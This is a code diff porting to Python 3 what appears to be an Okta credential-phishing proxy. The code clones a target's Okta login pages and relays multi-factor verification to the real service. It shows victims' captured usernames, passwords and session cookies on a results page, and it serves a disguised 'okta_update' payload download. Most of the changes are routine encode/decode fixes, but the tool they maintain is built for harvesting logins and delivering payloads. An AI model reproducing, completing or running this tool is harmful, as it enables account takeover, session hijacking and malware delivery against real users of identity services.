@@ -31,6 +31,7 @@ import ssl
 import sys
 import os
 import re
+import errno
 
 
 global users, guppies, basses, twonas, oktapuses, die, die_lock, lock
@@ -134,13 +135,13 @@ def download_site():
             if exc.errno != errno.EEXIST:
                 raise
     with open("webroot/index.html", 'w+') as index:
-        index.write(webContent)
+        index.write(webContent.decode())
 
     quiet_print("Downloading 404.html...", True)
     response = requests.get(args[0] + "/404")
     webContent = response.content
     with open("webroot/errors/404.html", 'w+') as error:
-        error.write(webContent)
+        error.write(webContent.decode())
 
     quiet_print("Dropping common error code...", True)
     with open("webroot/errors/auth.error", 'w+') as error:
@@ -276,26 +277,26 @@ class Results(BaseHTTPRequestHandler):
     def do_GET(self):
         if self.path == "/wateringhole":
             self._set_headers(200)
-            self.wfile.write("<html><body><h1>Results</h1>\n")
-            self.wfile.write("<h3>Guppies: " + str(guppies) + "</h3>\n")
-            self.wfile.write("<h3>Basses: " + str(basses) + "</h3>\n")
-            self.wfile.write("<h3>Twonas: " + str(twonas) + "</h3>\n")
-            self.wfile.write("<h3>Oktapuses: " + str(oktapuses) + "</h3>\n")
-            self.wfile.write("<hr> </br>")
+            self.wfile.write(("<html><body><h1>Results</h1>\n").encode())
+            self.wfile.write(("<h3>Guppies: " + str(guppies) + "</h3>\n").encode())
+            self.wfile.write(("<h3>Basses: " + str(basses) + "</h3>\n").encode())
+            self.wfile.write(("<h3>Twonas: " + str(twonas) + "</h3>\n").encode())
+            self.wfile.write(("<h3>Oktapuses: " + str(oktapuses) + "</h3>\n").encode())
+            self.wfile.write(("<hr> </br>").encode())
             for rid in users:
-                self.wfile.write("<b>User: </b>" + rid + "&nbsp;&nbsp;&nbsp;&nbsp;")
-                self.wfile.write("<b>Status: </b>" + self.get_status(rid) + "</br>")
-                self.wfile.write("<b>Usernames: </b>" +
-                                 bleach.clean(' '.join(users[rid].username)) + "</br>")
-                self.wfile.write("<b>Passwords: </b>" +
-                                 bleach.clean(' '.join(users[rid].password)) + "</br>")
-                self.wfile.write("<b>Sessions: </b>")
+                self.wfile.write(("<b>User: </b>" + rid + "&nbsp;&nbsp;&nbsp;&nbsp;").encode())
+                self.wfile.write(("<b>Status: </b>" + self.get_status(rid) + "</br>").encode())
+                self.wfile.write(("<b>Usernames: </b>" +
+                                 bleach.clean(' '.join(users[rid].username)) + "</br>").encode())
+                self.wfile.write(("<b>Passwords: </b>" +
+                                 bleach.clean(' '.join(users[rid].password)) + "</br>").encode())
+                self.wfile.write(("<b>Sessions: </b>").encode())
                 for (req_sesh) in users[rid].sessions:
-                    self.wfile.write(bleach.clean(req_sesh.cookies['sid']))
-                self.wfile.write("</br> </br>")
-                self.wfile.write("<hr> </br>")
+                    self.wfile.write(bleach.clean(req_sesh.cookies['sid']).encode())
+                self.wfile.write(("</br> </br>").encode())
+                self.wfile.write(("<hr> </br>").encode())
 
-            self.wfile.write("</body></html>")
+            self.wfile.write(("</body></html>").encode())
         else:
             return
 
@@ -330,7 +331,7 @@ class S(BaseHTTPRequestHandler):
         self.end_headers()
 
     def serve_file(self, filename):
-        with open("webroot/" + filename, 'r') as file:
+        with open("webroot/" + filename, 'rb') as file:
             self.wfile.write(file.read())
 
     def get_rid_cookie(self):
@@ -371,7 +372,7 @@ class S(BaseHTTPRequestHandler):
             elif (self.path == "/download-update" and options.payload != ""):
                 self.send_response(200)
                 self.send_header('Content-type', options.content_type)
-                self.send_header('Content-Length', os.stat("webroot/okta_update").st_size)
+                self.send_header('Content-Length', str(os.stat("webroot/okta_update").st_size))
                 self.send_header("Connection", "close")
                 self.end_headers()
 
@@ -451,7 +452,7 @@ class S(BaseHTTPRequestHandler):
         self.send_header("Connection", "close")
         self.end_headers()
         self.serve_file("errors/auth.error")
-        self.wfile.write("\n")
+        self.wfile.write(b"\n")
 
     def do_POST(self):
         global users, guppies, basses, twonas, oktapuses, lock
@@ -511,15 +512,15 @@ class S(BaseHTTPRequestHandler):
                         self.send_header(header, response.headers[header])
                 self.send_header("Connection", "close")
                 self.end_headers()
-                self.wfile.write(bypass)
-                self.wfile.write('\r\n')
+                self.wfile.write(bypass.encode())
+                self.wfile.write(b'\r\n')
                 return
             else:
                 # Assume 2factor, pass to their Okta
                 self.data_string = self.rfile.read(int(self.headers['Content-Length']))
                 data = simplejson.loads(self.data_string)
                 response = handle_mfa_verify(self.path, data)
-                new_content = response.content.replace(args[0], args[1])
+                new_content = response.content.replace(args[0].encode(), args[1].encode())
 
                 rid = self.get_rid_cookie()
                 if (rid != None and rid != ""):
@@ -546,7 +547,7 @@ class S(BaseHTTPRequestHandler):
                     self.send_header("Connection", "close")
                     self.end_headers()
                     self.wfile.write(new_content)
-                    self.wfile.write('\r\n')
+                    self.wfile.write(b'\r\n')
                     return
                 else:
                     self.send_sign_on_error()
